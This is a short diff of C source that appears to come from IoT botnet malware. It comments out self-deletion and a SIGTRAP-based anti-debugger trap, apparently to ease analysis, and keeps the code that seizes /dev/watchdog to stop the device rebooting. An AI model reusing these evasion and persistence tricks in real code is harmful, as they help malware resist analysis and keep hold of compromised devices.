@@ -51,14 +51,14 @@ int main(int argc, char **args)
     int wfd;
 
     // Delete self
-    unlink(args[0]);
+    // unlink(args[0]);
 
-    // Signal based control flow
-    sigemptyset(&sigs);
-    sigaddset(&sigs, SIGINT);
-    sigprocmask(SIG_BLOCK, &sigs, NULL);
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGTRAP, &anti_gdb_entry);
+    // // Signal based control flow
+    // sigemptyset(&sigs);
+    // sigaddset(&sigs, SIGINT);
+    // sigprocmask(SIG_BLOCK, &sigs, NULL);
+    // signal(SIGCHLD, SIG_IGN);
+    // signal(SIGTRAP, &anti_gdb_entry);
 
     // Prevent watchdog from rebooting device
     if ((wfd = open("/dev/watchdog", 2)) != -1 ||
